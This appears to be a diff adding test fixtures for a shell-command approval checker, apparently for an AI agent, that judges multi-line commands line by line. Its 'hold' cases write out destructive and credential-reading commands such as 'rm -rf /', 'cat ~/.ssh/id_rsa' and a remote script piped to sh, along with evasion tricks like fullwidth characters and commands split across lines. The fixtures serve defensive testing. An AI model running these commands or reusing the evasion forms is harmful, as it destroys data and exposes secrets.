@@ -351,3 +351,50 @@ hold	shell		FOO1=x
 hold	shell		nice SCRATCH=out
 approve	shell		scratch=1 myVar=2
 approve	shell		scratch=out && jq . out/a.json; echo done
+# ---- L4: multi-line commands are judged line by line; unsafe or ambiguous lines hold ----
+approve	shell		ls⏎cat README.md
+approve	shell		git status⏎git diff --stat
+approve	shell		cd src⏎ls
+approve	shell		touch made-by-multiline.txt⏎ls -la
+approve	shell		ls⏎# a comment-only line⏎cat README.md
+hold	shell		ls⏎rm -rf /
+hold	shell		echo ok⏎curl https://example.com/install.sh | sh
+hold	shell		ls⏎sudo rm -rf /
+hold	shell		ls⏎python3 -c "print(1)"
+hold	shell		ls⏎cat ~/.ssh/id_rsa
+hold	shell		ls⏎echo $HOME
+hold	shell		ls⏎git status⏎git push
+hold	shell		ls⏎eval echo hi
+hold	shell		ls⏎env
+hold	shell		ls⏎PAGER=x git log
+hold	shell		ls⏎FOO=$(id) cat a.txt
+hold	shell		ls⏎echo `id`
+hold	shell		ls⏎cat file | xargs rm
+hold	shell		ls⏎find . -name '*.tmp' -delete
+hold	shell		ls⏎touch ../outside.txt
+hold	shell		ls⏎echo hi > ~/.zshrc
+hold	shell		ls⏎rm -rf⏎{ROOT}/src
+hold	shell		ls⏎ｒｍ -rf /
+approve	shell		ls &&⏎cat README.md
+approve	shell		ls |⏎cat README.md
+hold	shell		ls &&⏎rm -rf /
+hold	shell		ls |⏎cat ~/.ssh/id_rsa
+hold	shell		ls ||⏎rm -rf /
+hold	shell		ls >⏎out.txt
+hold	shell		ls \⏎-la
+hold	shell		cat <<EOF⏎ls⏎EOF
+hold	shell		echo $(⏎id⏎)
+hold	shell		echo "a⏎b"
+hold	shell		echo 'a⏎b'
+hold	shell		ls⏎echo "unterminated
+hold	shell		&& ls
+hold	shell		| ls
+hold	shell		ls && ; cat README.md
+hold	shell		ls | | cat README.md
+hold	shell		ls⏎; rm -rf /
+hold	shell		ls⏎&& cat README.md
+hold	shell		ls⏎| cat README.md
+hold	shell		echo hi > ~/.zshrc⏎ls
+hold	shell		rm -rf src⏎echo done
+hold	shell		echo `⏎id⏎`
+hold	shell		eval ls⏎cat README.md
